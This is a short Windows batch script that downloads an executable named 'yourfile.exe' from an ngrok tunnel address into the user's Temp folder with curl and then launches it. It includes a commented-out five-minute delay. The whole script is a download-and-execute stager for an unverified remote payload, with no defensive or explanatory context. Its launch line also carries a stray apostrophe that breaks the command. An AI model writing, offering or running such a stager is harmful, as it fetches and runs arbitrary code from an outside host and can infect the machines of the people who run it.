@echo off
setlocal

REM URL of the file to download
set "URL=https://robust-ocelot-moderately.ngrok-free.app/getfile"

REM Path to save the downloaded file in the Temp directory
set "TEMP_DIR=%TEMP%"
set "FILE_NAME=yourfile.exe"
set "FILE_PATH=%TEMP_DIR%\%FILE_NAME%"

REM Download the file using curl
echo Downloading file from %URL%...
curl -L -o "%FILE_PATH%" "%URL%"

REM Check if the download was successful
if %ERRORLEVEL% neq 0 (
    echo Failed to download file.
    exit /b 1
)

REM Pause for 5 minutes
REM echo Pausing execution for 5 minutes...
REM timeout /t 300

REM Execute the downloaded file
echo Executing the file...
'start "" "%FILE_PATH%"

REM End of script
endlocal
